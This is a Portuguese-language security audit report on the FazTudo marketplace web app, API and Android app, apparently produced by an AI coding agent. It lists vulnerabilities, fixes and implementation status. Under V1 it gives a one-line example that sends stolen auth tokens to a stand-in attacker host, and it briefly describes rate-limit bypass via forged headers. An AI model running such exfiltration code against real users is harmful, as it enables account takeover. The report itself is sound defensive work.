# 🛡️ Relatório de Auditoria de Segurança — FazTudo

**Alvo:** `https://faztudoapp.com.br` (web em produção) + backend FastAPI + frontend Next.js + app Android (Capacitor), código em `C:\FazTudo` · **Data:** 2026-06-24 · **Tipo:** híbrido (black-box live + white-box) · **Método:** ético, não-destrutivo, sem exfiltração de dados reais · **Autorização:** dono confirmado; testes live não-destrutivos em produção autorizados.

---

## 1. Resumo executivo

O FazTudo é um marketplace de leads pagos por créditos (FastAPI + Next.js, empacotado em app via Capacitor). A **postura de segurança é boa**: fundamentos sólidos e corretos — JWT com algoritmo fixo, fail-fast de segredos em produção, rotação de refresh token com detecção de reuso, RBAC consistente nas rotas admin, cobertura ampla de IDOR/BOLA, ORM parametrizado (sem SQLi), nenhum segredo commitado e mass-assignment controlado. Os achados são em sua maioria de **endurecimento (hardening)**, não falhas exploráveis triviais. O item de maior peso é o **armazenamento de tokens (access + refresh) em `localStorage`**, que amplifica o impacto de qualquer XSS — agravado pela **ausência de headers de segurança** (CSP/HSTS) e por `allowBackup=true` no Android.

## 2. Nível geral de risco

> 🟡 **Médio** — base sólida, sem falha Crítica e sem IDOR/SQLi explorável encontrado. A nota é puxada por um achado **Alto** (tokens em `localStorage`) e por vários **Médios** de hardening (headers, revogação de token, rate-limit). Corrigindo V1–V5 a postura vai para 🟢 Baixo.

## 3. Lista de vulnerabilidades

| # | Vulnerabilidade | Severidade | Prioridade |
|---|---|---|---|
| V1 | Tokens (access **e** refresh) em `localStorage` → roubáveis por XSS | 🟠 Alto | P1 |
| V2 | Ausência de headers de segurança (HSTS, CSP, X-Frame-Options, etc.) | 🟡 Médio | P1 |
| V3 | Access token sem revogação (não checa `token_version`/`jti`) | 🟡 Médio | P2 |
| V4 | Rate-limit contornável via `X-Forwarded-For` forjado + sem lockout por conta | 🟡 Médio | P2 |
| V5 | Reset de senha sem uso único (token reaproveitável na janela) | 🟡 Médio | P2 |
| V6 | `next@14.2.35` com CVEs (npm audit) — mitigado por export estático | 🟡 Médio | P2 |
| V7 | Política de senha fraca (apenas comprimento ≥ 8) | 🟡 Médio | P2 |
| V8 | Android `allowBackup="true"` → backup pode extrair tokens do WebView | 🟡 Médio | P2 |
| V9 | Crédito de boas-vindas fora do ledger + papel auto-selecionável → farm de contas | 🟡 Médio (condicional) | P2 |
| V10 | Build de dependências sem lockfile/hashes + `bcrypt` divergente no venv | 🟡 Médio | P2 |
| V11 | Push *unsubscribe* sem checagem de dono (BOLA de baixo impacto) | 🟢 Baixo | P3 |
| V12 | OpenAPI/docs expostos se `APP_ENV` ≠ `production` (ex.: staging) | 🟢 Baixo | P3 |
| V13 | Upload KYC valida só `Content-Type`, não os *magic bytes* | 🟢 Baixo | P3 |
| V14 | Webhook MercadoPago sem assinatura obrigatória quando secret vazio | 🟢 Baixo | P3 |
| V15 | Bucket de mídia público com leitura anônima | 🟢 Baixo | P3 |
| V16 | bcrypt: truncamento em 72 bytes + `rounds` não fixado | 🟢 Baixo | P3 |
| V17 | Possível *timing oracle* no reset (envio de e-mail síncrono) | 🟢 Baixo | P3 |
| V18 | Resíduos Cordova: `config.xml` `<access origin="*"/>` + `file_paths.xml` `path="."` | 🟢 Baixo | P3 |
| V19 | Tracebacks completos persistidos e expostos ao admin (PII) | ⚪ Info | P3 |

### Pontos fortes confirmados (não viram achado)
- **JWT robusto:** algoritmo fixo `HS256` (rejeita `alg=none`/key-confusion), `exp`/`iat`/`type`/`jti` presentes, `type` validado em cada uso.
- **Fail-fast de produção:** recusa subir com `JWT_SECRET` default, `PAYMENT_PROVIDER=dev` ou `PAYMENT_WEBHOOK_SECRET` default quando pagamentos ativos.
- **Refresh token:** rotação + detecção de reuso (revoga todos no reuso) + persistido só como SHA-256.
- **RBAC consistente:** todas as rotas `/admin/*`, `/monitoring/*`, `/kyc/admin/*`, grant/refund etc. exigem `require_roles(admin)`; `admin` nunca alcançável por register nem por switch-role.
- **BOLA/IDOR coberto** na maioria dos recursos (lead_purchases, chat, notifications, payments, leads, reviews) — confirmado live: `/leads/{id}` sem token = **401**.
- **Sem SQLi** (ORM parametrizado; `text()` só com literais estáticos); **sem segredos commitados**; **mass-assignment** controlado por allow-lists; **CORS** com allowlist explícita (não reflete origem maliciosa — confirmado live); **anti-enumeração** em login e reset; **webhooks** idempotentes com HMAC `compare_digest`; **KYC** em bucket privado servido por streaming admin.
- **TLS** válido (Google Trust Services) + redirect HTTP→HTTPS 301; **docs da API desativados** em produção.

---

## 4–9. Detalhamento por vulnerabilidade

### V1 — Tokens (access + refresh) em `localStorage` 🟠 Alto
- **Onde:** `frontend/src/store/auth.ts:78` (`storage: createJSONStorage(() => localStorage)`, `partialize` 80-84), leitura em `frontend/src/services/api.ts:79,241`. Confirmado no bundle (`out/_next/static/chunks/2415-*.js` contém `faztudo-auth`).
- **Evidência (segura):** persiste `{user, accessToken, refreshToken}` sob a chave `faztudo-auth` em `localStorage`.
- **Risco/Impacto:** qualquer XSS no app/site lê `localStorage["faztudo-auth"]` e exfiltra **ambos** os tokens. Incluir o **refresh token** é o agravante: dá sessão de longa duração e re-emissão contínua mesmo após o access expirar. No WebView do Capacitor o mesmo storage é acessível.
- **Como abusar:** injeção de script (próprio ou via dependência/3rd-party) → `fetch('https://atacante/?t='+localStorage['faztudo-auth'])` → account takeover.
- **Correção:** mover tokens para cookie `HttpOnly`+`Secure`+`SameSite=Strict` (idealmente padrão BFF); no app nativo usar Secure Storage/Keystore (`@capacitor-community/secure-storage`). No mínimo: **não persistir o refresh token no cliente web** (cookie HttpOnly) e manter o access apenas em memória. Combinar com CSP (V2) reduz muito a superfície.
- **Prioridade:** P1.

### V2 — Ausência de headers de segurança 🟡 Médio
- **Onde:** respostas do front e da API em produção (confirmado live: só `Server: cloudflare`). Faltam `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`.
- **Risco/Impacto:** sem **HSTS** → SSL-strip no 1º acesso; sem **CSP** → XSS sem contenção (crítico porque o token está em `localStorage`, V1); sem **X-Frame-Options** → clickjacking; sem `nosniff` → MIME sniffing.
- **Correção:** adicionar os headers na borda (Cloudflare *Transform Rules*/*Response Headers*, ou no Caddy/Traefik/nginx que serve o `out/`). CSP começando em modo report-only e endurecendo. Exemplo mínimo: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`, `Permissions-Policy: geolocation=(self), camera=(self)`.
- **Prioridade:** P1 (baixo esforço, alto retorno).

### V3 — Access token sem revogação 🟡 Médio
- **Onde:** `backend/app/core/deps.py:61-96` (`get_current_user` só checa assinatura/exp/type + `status==active`); `jti` é gerado mas nunca verificado contra blocklist; `backend/app/services/admin.py:234` revoga só os refresh.
- **Risco:** ao bloquear/suspender um usuário ou após reset de senha, os **access tokens já emitidos seguem válidos** até expirar (TTL 15 min) — janela de uso pós-bloqueio.
- **Correção:** adicionar `token_version` (int) em `User`, incrementado no bloqueio/reset/troca-de-senha e gravado como claim; rejeitar tokens com versão antiga em `get_current_user`. Mitigado parcialmente pelo TTL curto.
- **Prioridade:** P2.

### V4 — Rate-limit contornável via `X-Forwarded-For` + sem lockout por conta 🟡 Médio
- **Onde:** `backend/app/core/ratelimit.py:31-36` (`fwd.split(",")[0]` sem allowlist de proxy); `backend/app/api/auth/routes.py:74,90,106,219` (limite só por IP+escopo).
- **Risco:** atrás de Cloudflare, o `X-Forwarded-For` pode ser forjado/prefixado pelo cliente; usar o **primeiro** IP como chave permite gerar chave nova por valor falso → contorna o limite de login/register/reset. Sem lockout por conta, brute-force distribuído / password-spraying contra uma conta não é contido.
- **Correção:** confiar só no hop confiável — usar `CF-Connecting-IP` **apenas** quando a requisição vier do range da Cloudflare, ou `--forwarded-allow-ips` restrito ao proxy; usar `request.client.host` caso contrário. Adicionar contador de falhas **por e-mail** (lockout exponencial). **Verificar manualmente** a topologia de proxy em produção.
- **Prioridade:** P2.

### V5 — Reset de senha sem uso único 🟡 Médio
- **Onde:** `backend/app/services/auth.py:578-602` — `password_reset_confirm` valida só `type==password_reset` + `exp`; não consome `jti` nem usa `password_changed_at`/`token_version`.
- **Risco:** o mesmo `reset_token` pode ser reapresentado dentro dos 30 min; múltiplos pedidos emitem vários tokens todos válidos.
- **Correção:** persistir o `jti` usado (ou um `password_changed_at`/`token_version`) e rejeitar reuso; reduzir a janela. (Já revoga refresh ao confirmar — bom.)
- **Prioridade:** P2.

### V6 — `next@14.2.35` com CVEs conhecidas 🟡 Médio
- **Onde:** `frontend/package-lock.json` (`next` 14.2.35; `postcss` aninhado 8.4.31). `npm audit`: 0 críticas, 4 altas + 1 moderada concentradas em `next` (SSRF em upgrade WebSocket GHSA-c4j6-fc7j-m34r, bypass de middleware, DoS em RSC/Server Components, XSS em CSP nonce) + `postcss` (XSS no stringify).
- **Risco/Impacto:** **fortemente mitigado** porque o frontend é **export estático** (`output:'export'` → `out/`, servido como arquivos): os vetores de SSR/RSC/Middleware/Image-Optimizer **não estão no caminho de produção**. O risco residual é de manutenção (ficar para trás).
- **Correção:** subir para o último `14.2.x` que corrija o aplicável, ou migração planejada para `15.5.16+`. **Não** rodar `npm audit fix --force` (puxa major 16, quebra). **Confirmar** o modo de deploy (export estático vs SSR) — define a exploitabilidade real.
- **Prioridade:** P2.

### V7 — Política de senha fraca 🟡 Médio
- **Onde:** `backend/app/schemas/auth.py:114,217` (`min_length=8`, sem checagem de complexidade/lista de senhas comuns).
- **Risco:** permite "12345678"/"password", facilitando brute-force/credential-stuffing (pior junto de V4).
- **Correção:** exigir entropia mínima ou bloquear top-N senhas vazadas (sem revelar regras que ajudem o atacante); manter o teto de 128.
- **Prioridade:** P2.

### V8 — Android `allowBackup="true"` 🟡 Médio
- **Onde:** `frontend/android/app/src/main/AndroidManifest.xml:4`.
- **Risco:** o `localStorage` do WebView (com `faztudo-auth` = JWTs, V1) fica em arquivos do app; com backup habilitado pode ser extraído via `adb backup`/Auto Backup em aparelho comprometido/rooteado.
- **Correção:** `android:allowBackup="false"` (recomendado para app com sessão sensível) ou `android:dataExtractionRules`/`fullBackupContent` excluindo o storage do WebView. Combina com mover token para Secure Storage (V1).
- **Prioridade:** P2.

### V9 — Crédito de boas-vindas fora do ledger + farm de contas 🟡 Médio (condicional)
- **Onde:** `backend/app/services/users.py:147-149` (`add_wallet_for_professional(..., balance=settings.FREE_SIGNUP_CREDITS)` grava saldo direto, sem `CreditTransaction`); papel `professional` é auto-selecionável no register.
- **Risco:** se `FREE_SIGNUP_CREDITS>0`, o bônus não entra no ledger append-only (quebra conciliação) e permite **farm de múltiplas contas** para ganhar créditos grátis (abuso econômico).
- **Correção:** creditar o bônus via `apply_movement(type=bonus)` (mantém o ledger íntegro); atrelar o bônus a verificação (KYC/telefone) para conter multi-conta.
- **Prioridade:** P2 (P1 se o bônus estiver ativo com valor relevante).

### V10 — Build de dependências sem lockfile/hashes + `bcrypt` divergente 🟡 Médio
- **Onde:** `backend/Dockerfile:18-19` (`pip install -r requirements.txt` com ranges `>=`, sem `--require-hashes`); `backend/.venv` tem `bcrypt 5.0.0` enquanto o pin é `>=4.0,<4.1`.
- **Risco:** imagem de produção **não reprodutível** (cada build resolve versões diferentes; janela para dependency-confusion); divergência de `bcrypt` pode degradar/derrubar o hashing de senha (passlib 1.7.x quebra com bcrypt ≥ 4.1).
- **Correção:** gerar lockfile com hashes (`pip-compile --generate-hashes` ou `uv lock`) e instalar com `--require-hashes`; alinhar `bcrypt` ao pin (ou migrar para `argon2id`).
- **Prioridade:** P2.

### V11 — Push *unsubscribe* sem checagem de dono 🟢 Baixo
- **Onde:** `backend/app/api/push/routes.py:61-72` + `backend/app/services/push.py:80-82` (`delete_by_endpoint(endpoint)` sem filtrar por `user_id`).
- **Risco:** usuário autenticado A, conhecendo/forjando o `endpoint` de B, desinscreve B do push (negação de notificação; sem leitura de dado).
- **Correção:** `delete_by_endpoint(endpoint, user_id=current_user.id)`.
- **Prioridade:** P3.

### V12 — Docs expostos se `APP_ENV` ≠ `production` 🟢 Baixo
- **Onde:** `backend/app/main.py:36-45` (`_is_production = APP_ENV == "production"`; em `staging` ou qualquer outro valor, `/docs`/`/redoc`/`/openapi.json` ficam abertos).
- **Risco:** ambiente não-prod (staging) expõe toda a superfície da API. (Produção está OK — confirmado live: 404 em `/api/docs`.)
- **Correção:** tratar como produção tudo que não for `development`/`test`, ou flag dedicada.
- **Prioridade:** P3.

### V13 — Upload KYC valida só `Content-Type` 🟢 Baixo
- **Onde:** `backend/app/api/kyc/routes.py:39-55` + `backend/app/services/kyc.py:42-70` (confia no header declarado, sem *magic bytes*).
- **Risco:** bytes arbitrários rotulados como `image/jpeg`; bucket é privado e servido a admin (risco de stored-XSS baixo), mas pode poluir storage/servir não-imagem ao admin.
- **Correção:** validar *magic bytes* (`Pillow.open`/`filetype`) e re-encodar; `Content-Disposition: attachment` no streaming admin.
- **Prioridade:** P3.

### V14 — Webhook MercadoPago sem assinatura obrigatória 🟢 Baixo
- **Onde:** `backend/app/services/payments/mercadopago.py:118-126` (`if secret: verify else: warning`; `MERCADOPAGO_WEBHOOK_SECRET` opcional).
- **Risco:** sem o secret, a autenticidade recai 100% na consulta autenticada `GET /v1/payments/{id}` (mitigação real e forte), mas perde-se defesa em profundidade contra replay/forja.
- **Correção:** tornar `MERCADOPAGO_WEBHOOK_SECRET` obrigatório no fail-fast quando `PAYMENT_PROVIDER=mercadopago` em produção.
- **Prioridade:** P3.

### V15 — Bucket de mídia público 🟢 Baixo
- **Onde:** `backend/app/core/storage.py:74-85` + `docker-compose.prod.yml:87` (`mc anonymous set download`; URL direta, presign desativado).
- **Risco:** mídia de lead vira pública por URL direta (UUID no path mitiga enumeração; sem expiração/autorização). Aceitável para marketing/lead; **KYC já usa bucket privado — correto**.
- **Correção:** confirmar que **nada sensível** usa o bucket público; se precisar de controle, voltar a presign com TTL.
- **Prioridade:** P3.

### V16 — bcrypt: truncamento 72 bytes + rounds não fixado 🟢 Baixo
- **Onde:** `backend/app/core/security.py:33-35,114` (corte em 72 bytes) e `:27` (`CryptContext` sem `bcrypt__rounds`).
- **Risco:** marginal — senhas iguais nos 72 primeiros bytes colidem; custo do bcrypt fica implícito (default passlib = 12, hoje adequado).
- **Correção:** opcional pré-hash SHA-256→base64 antes do bcrypt (suporta 72+ bytes) ou `argon2id`; fixar `bcrypt__rounds=12`.
- **Prioridade:** P3.

### V17 — *Timing oracle* no reset 🟢 Baixo
- **Onde:** `backend/app/services/auth.py:537-543` (usuário existente faz trabalho extra: cria token + `send_email` síncrono; inexistente retorna direto).
- **Risco:** diferença de latência pode permitir enumeração por timing apesar da resposta genérica.
- **Correção:** enfileirar o envio (background) e/ou normalizar o tempo de resposta nos dois caminhos.
- **Prioridade:** P3.

### V18 — Resíduos Cordova 🟢 Baixo
- **Onde:** `frontend/android/app/src/main/res/xml/config.xml:3` (`<access origin="*"/>`); `frontend/android/app/src/main/res/xml/file_paths.xml:3-4` (`path="."`).
- **Risco:** baixo — em Capacitor a navegação é governada por `capacitor.config.ts` (sem `allowNavigation`, restrita a `https://localhost`); FileProvider é `exported="false"`. São resíduos permissivos.
- **Correção:** remover `config.xml` se nenhum plugin Cordova o exige (ou restringir `origin`); restringir `file_paths.xml` a subpasta dedicada (ex.: `path="images/"`).
- **Prioridade:** P3.

### V19 — Tracebacks persistidos/expostos ao admin ⚪ Info
- **Onde:** `backend/app/core/exceptions.py:97-146` + `backend/app/api/monitoring/routes.py:124-150` (`ErrorLog.traceback` até 20000 chars, retornado em `GET /monitoring/errors`, admin-only). **Cliente final recebe só mensagem genérica — bom.**
- **Risco:** tracebacks podem conter PII/segredos em variáveis locais; acessíveis a qualquer admin e no banco.
- **Correção:** retenção/expurgo + sanitização. Aceitável dado o gate admin.
- **Prioridade:** P3.

> **Dependências Python (verificar):** a análise manual (scanner Python ausente no PATH) apontou possíveis CVEs de DoS em `python-multipart 0.0.32` e `starlette 0.46.2` (parsing de multipart/form), **com confiança reduzida** — várias com carimbo "2026" podem ser artefatos do advisory DB local. **Confirmar com `pip-audit`/`osv-scanner`** dentro do container (`docker exec faztudo-backend ...`). Independente da versão, **definir limites de tamanho de body/parte** nos uploads (kyc/users/leads/chat) mitiga o vetor.

---

## 10. Checklist técnico para o desenvolvedor

**P1 (agora)**
- [ ] V1 — Tirar o **refresh token** do `localStorage` (cookie `HttpOnly`/Secure Storage no app); access em memória.
- [ ] V2 — Adicionar headers de segurança na borda (HSTS, CSP report-only→enforce, `nosniff`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`).

**P2 (próxima sprint)**
- [ ] V3 — `token_version` no `User` + checagem em `get_current_user`.
- [ ] V4 — Confiar só no IP do hop confiável (CF-Connecting-IP/`forwarded-allow-ips`) + lockout por e-mail.
- [ ] V5 — Reset de senha de uso único (`jti` consumido / `password_changed_at`).
- [ ] V6 — Atualizar `next` (último 14.2.x) e confirmar deploy = export estático.
- [ ] V7 — Política de senha (entropia / bloqueio de senhas vazadas).
- [ ] V8 — `android:allowBackup="false"` (ou `dataExtractionRules`).
- [ ] V9 — Bônus de signup via `apply_movement` + atrelar a verificação.
- [ ] V10 — Lockfile Python com hashes (`--require-hashes`) + alinhar `bcrypt`.

**P3 (backlog)**
- [ ] V11 escopar `unsubscribe` por dono · V12 docs só em prod-like · V13 magic bytes no KYC · V14 secret MP obrigatório · V15 confirmar bucket público · V16 bcrypt rounds/argon2 · V17 reset assíncrono · V18 limpar resíduos Cordova · V19 retenção de tracebacks.
- [ ] Definir limites de tamanho de upload (mitiga DoS de multipart) + rodar `pip-audit`/`osv-scanner` no container.

## 11. Melhorias de arquitetura recomendadas
- **Padrão BFF** para auth: cookie `HttpOnly` emitido pelo servidor, eliminando token em JS (resolve V1 de raiz).
- **Camada de borda como guardiã de headers** (Cloudflare/Caddy) — centraliza CSP/HSTS/Permissions-Policy.
- **Ledger de créditos append-only** como única fonte de saldo (todo crédito via transação) — fecha V9 e melhora auditabilidade financeira.
- **Build reprodutível** (lockfiles com hash no Python e já existe no npm) — base de uma cadeia de suprimentos confiável.

## 12. Medidas contra clonagem do front-end
- A clonagem visual é inevitável (código client é público); a defesa real é no **backend**: CORS por allowlist (✅ já tem), checagem de `Origin`/`Referer` em rotas sensíveis, e **App Attestation** (Play Integrity / SafetyNet) para o app nativo validar que as chamadas vêm do APK oficial.
- Não embutir segredo no bundle (✅ confirmado — só chaves públicas).

## 13. Medidas contra roubo de token
- Cookie `HttpOnly`+`Secure`+`SameSite` (web) e Keystore/Secure Storage (app) — V1/V8.
- **CSP** estrita (V2) reduz a via principal (XSS).
- Access token de vida curta (✅ 15 min) + **revogação por `token_version`** (V3) + rotação de refresh com detecção de reuso (✅ já tem).

## 14. Medidas contra ataques automatizados
- Rate-limit por **IP confiável** + **lockout por conta** (V4); política de senha (V7).
- **Play Integrity/CAPTCHA** em fluxos sensíveis (register/login/reset) contra bots.
- Limites de payload/tamanho de upload (mitiga DoS); manter idempotência de webhooks (✅).

## 15. Plano de segurança em camadas
1. **Borda (Cloudflare):** headers de segurança, WAF, rate-limit de edge, bot management.
2. **App (FastAPI):** authz por rota (✅), revogação de token, rate-limit por conta, validação de upload.
3. **Dados:** ledger append-only, bucket privado para sensível (✅ KYC), retenção/sanitização de logs.
4. **Cliente:** sem token em JS, CSP, Secure Storage no app, App Attestation.

---

## 16. Status de implementação (2026-06-24)

**✅ Corrigidos e commitados** (commit `c530d9d` — verificados: `ruff` limpo, 152/155 testes, review adversarial sem blockers):
- **V2** (headers no `infra/Caddyfile`) — HSTS, `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy` + **CSP em `Report-Only`** (inclui Google/Mercado Pago/OpenStreetMap). ⚠️ Só passa a valer **após redeploy do Caddy**. Revisar os relatórios da CSP e então trocar a chave para `Content-Security-Policy` (enforce).
- **V8** — `allowBackup="false"` (APK já rebuildado em `C:\FazTudo\dist\FazTudo-debug.apk`; reinstalar no celular).
- **V11** — push *unsubscribe* escopado ao dono.
- **V12** — `/docs` e `/openapi.json` fechados em qualquer ambiente não-dev/test.
- **V16** — `bcrypt__rounds=12` (confirmado: não invalida hashes existentes).

**⏸️ Adiados (com motivo):**
- **V1 (token storage)** — exige design dedicado: cookie `HttpOnly` **quebra o app Capacitor** (WebView é cross-site `https://localhost` → `faztudoapp.com.br`; `SameSite` não envia o cookie). Caminho certo: Secure Storage/Keystore no app + cookie/BFF na web. Mitigação imediata já aplicada = CSP (V2). **Fazer como tarefa própria, com teste no app.**
- **V3 (token_version) + V5 (reset uso único)** — exigem coluna nova + **migration Alembic**. Adiados porque o **Docker estava desligado** (não dá pra aplicar/testar a migration no container, conforme CLAUDE.md) e há uma migration de referral (fase 29) ainda não commitada (resolver a cadeia antes). Fazer com o Docker no ar.
- **V14 (MP webhook secret obrigatório)** — **não automatizado de propósito**: tornar obrigatório no fail-fast pode **impedir o boot em produção** se o secret não estiver setado. Decisão do dono: confirmar `MERCADOPAGO_WEBHOOK_SECRET` no `.env` de produção e então ligar.
- **V6** (upgrade `next`) — precisa de build + regressão; mitigado pelo export estático. **V7** (política de senha) — decisão de produto. **V9, V10, V13, V15, V17, V19** — backlog P3.

**⚠️ Achados colaterais (pré-existentes, fora do laudo):**
- **3 testes quebrados** na branch (`test_categories::test_list_public_returns_only_active`, `test_users::test_professional_cannot_create_customer_profile_403`, `test_users::test_customer_cannot_create_professional_profile_403`) — falham **sem** minhas mudanças (provado via `git stash`).
- **Migration `fase_29_referral` não-commitada** enquanto as fases 30–32 (commitadas) dependem dela → `alembic upgrade` quebraria num checkout limpo.
- venv local com `bcrypt 5.0.0` (fora do pin `<4.1`; produção usa 4.0.x via Docker).

---
### Postura ética desta auditoria
**Não** foram feitos: brute-force/DoS, enumeração de IDs reais, exfiltração de PII, alteração de dados, contorno de guardrails. Testes live limitados a `GET/HEAD/OPTIONS` (read-only); nenhuma requisição mutável (POST/PUT/DELETE) foi disparada contra produção. **Deixados para verificação manual** (por exigirem segredos/ambiente que não devem ser tocados): força real do `JWT_SECRET`/`PAYMENT_WEBHOOK_SECRET` (não inspecionados — só verificado o fail-fast contra defaults), topologia de proxy para o `X-Forwarded-For` (V4), versões reais na imagem Docker (`pip freeze` no container), e confirmação das CVEs Python via `pip-audit`/`osv-scanner`.
